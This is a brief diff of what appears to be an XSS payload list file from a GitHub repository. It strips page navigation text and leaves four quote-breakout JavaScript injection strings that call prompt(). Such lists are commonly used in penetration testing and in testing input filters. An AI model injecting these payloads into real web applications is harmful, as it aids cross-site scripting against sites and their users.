@@ -1,34 +1,4 @@
-Skip to content
-Search or jump to…
-
-Pull requests
-Issues
-Marketplace
-Explore
- 
-@minhdt71 
-TrinhBaLan
-/
-xss
-1
-00
-Code
-Issues
-Pull requests
-Actions
-Projects
-Wiki
-Security
-Insights
-xss/xsspayload.txt
-@TrinhBaLan
-TrinhBaLan Add files via upload
-Latest commit 010d121 3 days ago
- History
- 1 contributor
-6606 lines (6606 sloc)  457 KB
-  
-"-prompt(8)-"
+ "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
 ';a=prompt,a()//
